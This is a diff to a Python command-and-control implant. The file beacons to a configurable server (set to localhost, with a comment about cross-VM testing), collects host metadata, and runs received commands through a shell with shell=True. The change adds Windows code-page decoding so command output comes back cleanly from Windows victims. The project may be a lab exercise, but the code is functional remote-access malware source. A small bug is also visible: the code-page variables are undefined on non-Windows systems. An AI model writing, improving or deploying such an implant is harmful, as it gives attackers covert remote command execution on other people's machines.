@@ -1,10 +1,16 @@
-import os 
-import platform 
+import os
+import platform
 import subprocess
+import sys
 import uuid
 import time
 import requests
 from pathlib import Path
+
+if sys.platform == "win32":
+    import ctypes
+    _OEM_CP = f"cp{ctypes.windll.kernel32.GetOEMCP()}"
+    _ANSI_CP = f"cp{ctypes.windll.kernel32.GetACP()}"
 
 SERVER = "http://127.0.0.1:8000"    # change for cross VM testing
 BEACON_INTERVAL = 5                 # in seconds
@@ -27,19 +33,28 @@ def collect_metadata() -> dict:
         "os": f"{platform.system()} {platform.release()}"
     }
 
-def execute(command: str) -> str: 
-    try: 
+def _decode(data: bytes) -> str:
+    if not data:
+        return ""
+    for enc in ("utf-8", _OEM_CP, _ANSI_CP):
+        try:
+            return data.decode(enc)
+        except UnicodeDecodeError:
+            continue
+    return data.decode("utf-8", errors="replace")
+
+def execute(command: str) -> str:
+    try:
         result = subprocess.run(
-            command, 
+            command,
             shell=True,
-            capture_output=True, 
-            text=True, 
-            timeout=30,  
+            capture_output=True,
+            timeout=30,
         )
-        return (result.stdout or "") + (result.stderr or "")
+        return _decode(result.stdout) + _decode(result.stderr)
     except subprocess.TimeoutExpired:
         return "[!] Command timed out (30s)"
-    except Exception as e: 
+    except Exception as e:
         return f"[!] Execution error: {e}"
     
 def beacon(agent_id: str): 
